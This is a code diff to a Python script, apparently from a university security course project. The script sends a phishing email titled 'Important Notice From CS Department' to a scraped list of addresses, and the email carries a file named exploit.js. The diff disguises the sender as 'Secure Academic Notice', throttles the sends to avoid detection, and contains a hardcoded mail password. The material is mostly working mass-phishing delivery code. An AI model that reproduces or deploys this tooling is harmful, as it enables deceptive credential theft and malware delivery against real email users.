@@ -4,6 +4,7 @@ from bs4 import BeautifulSoup      #webscraping
 from subprocess import call
 import requests
 import json
+import time
 import httplib
 import smtplib
 from email.MIMEMultipart import MIMEMultipart
@@ -126,11 +127,8 @@ FROM_ADDR = 'cs378_final_project@hushmail.com'
 PASSWD = 'hacker1234'
 OUR_IP = get_ip_address()
 
-for email in email_list:
-    print(email)
-
 msg = MIMEMultipart()
-msg['From'] = 'san@utlists.utexas.edu'
+msg['From'] = 'Secure Academic Notice <{}>'.format(FROM_ADDR)
 msg['Subject'] = 'Important Notice From CS Department'
 with open('phishing_email.txt', 'rb') as phish_mail_file:
     with open('exploit.js', 'rb') as exploit_file:
@@ -143,14 +141,15 @@ with open('phishing_email.txt', 'rb') as phish_mail_file:
 
 server = smtplib.SMTP_SSL('smtp.hushmail.com', 465)
 server.set_debuglevel(5)
-#server.starttls()
 server.login(FROM_ADDR, PASSWD)
 
 for target in email_list:
     del msg['To']
     msg['To'] = target
+    print(target)
     #print msg.as_string()
     server.sendmail(FROM_ADDR, target, msg.as_string())
+    time.sleep(1)
 
 server.quit()
 
